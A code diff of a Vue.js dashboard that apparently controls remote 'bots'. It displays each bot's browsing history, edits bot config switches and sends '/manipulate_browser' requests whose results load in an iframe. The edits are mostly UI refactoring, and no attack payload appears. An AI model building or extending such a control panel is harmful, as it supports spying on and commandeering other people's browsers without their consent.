@@ -398,10 +398,9 @@
               </b-sidebar>
 
               <!-- HISTORY -->
-
               <b-sidebar
                 v-if="history_tab_show && bots_map[id_bot_selected].history"
-                id="sidebar-tab"
+                id="sidebar-history"
                 title="History"
                 left
                 shadow
@@ -415,7 +414,7 @@
                   autofocus
                 />
                 <b-list-group>
-                  <!-- <b-list-group-item
+                  <b-list-group-item
                     v-for="history in bots_map[id_bot_selected].history.filter(
                       (item) => {
                         const url = item.url
@@ -433,8 +432,11 @@
                     )"
                     v-bind:key="history.id"
                   >
-                    <p>{{ calc_date(history.lastVisitTime) }}</p>
-                      <p>{{ history.lastVisitTime | moment("YYYY-MM-DD hh:mm:ss") }}</p>
+                    <p>
+                      {{
+                        history.lastVisitTime | moment("YYYY-MM-DD hh:mm:ss")
+                      }}
+                    </p>
                     <p>
                       <span>
                         <b-badge href="#" variant="primary">{{
@@ -444,8 +446,7 @@
                         history.title
                       }}</b-link>
                     </p>
-                  </b-list-group-item> -->
-                  {{ bots_map[id_bot_selected].history[0] }}
+                  </b-list-group-item>
                 </b-list-group>
               </b-sidebar>
             </p>
@@ -507,38 +508,31 @@
                   </b-tree-view>
                 </b-tab>
                 <b-tab title="Config">
-                  <div class="input-group">
-                    <div class="input-group-prepend">
-                      <span class="input-group-text">Bot Name</span>
-                    </div>
+                  <div>
+                    <b-input-group prepend="Bot Name" class="mt-3">
+                      <b-form-input
+                        v-model="selected_bot.name"
+                        autofocus
+                      ></b-form-input>
+                    </b-input-group>
 
-                    <input
-                      type="text"
-                      class="form-control"
-                      placeholder="Please wait..."
-                      v-model="selected_bot.name"
-                      autofocus
-                    />
-                  </div>
-                  <div class="input-group">
-                    <div class="input-group-prepend">
-                      <span class="input-group-text">Bot Switch</span>
-                    </div>
-                    <b-form-checkbox
-                      v-for="key in Object.keys(selected_bot.switch_config)"
-                      v-bind:key="key"
-                      v-model="selected_bot.switch_config[key]"
-                      >{{ key }}</b-form-checkbox
-                    >
-                  </div>
+                    <b-input-group prepend="Bot Switch" class="mt-3">
+                      <b-form-checkbox
+                        v-for="key in Object.keys(selected_bot.switch_config)"
+                        v-bind:key="key"
+                        v-model="selected_bot.switch_config[key]"
+                        >{{ key }}</b-form-checkbox
+                      >
+                    </b-input-group>
 
-                  <b-button variant="primary" v-on:click="update_bot_config">
-                    <font-awesome-icon
-                      :icon="['fas', 'edit']"
-                      class="icon alt mr-1 ml-1"
-                    />
-                    Update
-                  </b-button>
+                    <b-button variant="primary" v-on:click="update_bot_config">
+                      <font-awesome-icon
+                        :icon="['fas', 'edit']"
+                        class="icon alt mr-1 ml-1"
+                      />
+                      Update
+                    </b-button>
+                  </div>
                 </b-tab>
                 <b-tab title="Browser">
                   <p>
@@ -552,7 +546,11 @@
                     </b-input-group>
                   </p>
                   <p>
-                    <iframe ref="browser_page"></iframe>
+                    <iframe
+                      ref="browser_page"
+                      width="100%"
+                      height="600px"
+                    ></iframe>
                   </p>
                 </b-tab>
               </b-tabs>
@@ -778,7 +776,7 @@ export default {
     },
     async manipulate() {
       const response = await api_request("POST", "/manipulate_browser", {
-        bot_id: this.id_bot_selected,
+        bot_id: this.selected_bot.id,
         path: this.check_path,
       });
       console.log(response);
@@ -823,29 +821,7 @@ export default {
     copy_toast() {
       this.$toastr.s("Copied to clipboard successfully.");
     },
-    calc_date(timestamp) {
-      const date = new Date(timestamp);
-      const year = date.getFullYear();
-      const month = (date.getMonth() + 1).toString().padStart(2, "0");
-      const day = date
-        .getDate()
-        .toString()
-        .padStart(2, "0");
-      const hours = date
-        .getHours()
-        .toString()
-        .padStart(2, "0");
-      const minutes = date
-        .getMinutes()
-        .toString()
-        .padStart(2, "0");
-      const seconds = date
-        .getSeconds()
-        .toString()
-        .padStart(2, "0");
-      const formattedDateTime = `${year}年${month}月${day}号 ${hours}:${minutes}:${seconds}`;
-      return formattedDateTime;
-    },
+
     async logout() {
       await api_request("GET", "/logout", false);
       this.user.is_authenticated = false;
@@ -878,7 +854,7 @@ export default {
     },
   },
   // Run on page load
-  mounted: async function() {
+  mounted: async function () {
     new ClipboardJS(".copy-element"); // eslint-disable-line
 
     // Update auth status
